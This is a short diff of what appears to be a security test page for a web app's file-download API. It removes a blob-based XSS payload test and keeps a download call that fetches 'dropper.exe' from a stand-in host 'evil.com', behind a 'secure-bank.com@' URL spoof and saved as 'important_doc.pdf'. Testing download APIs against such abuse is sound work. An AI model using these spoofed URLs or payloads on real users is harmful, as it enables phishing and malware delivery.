@@ -15,14 +15,6 @@ WebApp.downloadFile({
 });
 </script>
 <script>
-const blob = new Blob(["<img src=x onerror=alert(1)>"], { type: "text/html" });
-const blobUrl = URL.createObjectURL(blob);
-WebApp.downloadFile({
-  url: blobUrl,
-  name: "blob_xss.html"
-});
-</script>
-<script>
 WebApp.downloadFile({
   url: "https://secure-bank.com@evil.com/dropper.exe",
   name: "important_doc.pdf"
